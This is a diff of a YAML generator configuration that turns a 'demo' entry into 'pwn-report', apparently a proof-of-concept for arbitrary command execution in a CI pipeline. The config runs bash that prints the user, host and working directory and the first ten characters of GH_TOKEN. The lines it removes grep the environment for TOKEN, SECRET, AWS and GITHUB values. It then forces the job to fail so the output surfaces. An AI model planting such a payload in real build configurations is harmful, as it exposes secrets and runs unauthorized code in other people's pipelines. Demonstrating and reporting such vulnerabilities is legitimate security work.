@@ -2,14 +2,19 @@ generators:
   - |-
     kind: Exec
     metadata:
-      name: demo
+      name: pwn-report
     spec:
       bin: /bin/bash
       args: 
         - -c
         - |
-          echo "--- PWN START ---"
-          id
-          whoami
-          env | grep -E "TOKEN|SECRET|AWS|GITHUB" | cut -c 1-5 # Print prefixes to prove access
-          echo "--- PWN END ---"
+          echo "=========================================="
+          echo "!!! CI EXECUTION VULNERABILITY DETECTED !!!"
+          echo "User: $(whoami)"
+          echo "Host: $(hostname)"
+          echo "Directory: $(pwd)"
+          # We prove access to the environment without leaking the whole token
+          echo "Token Prefix: ${GH_TOKEN:0:10}..." 
+          echo "=========================================="
+          # Exit 1 forces the job to fail, making your output easy to find
+          exit 1
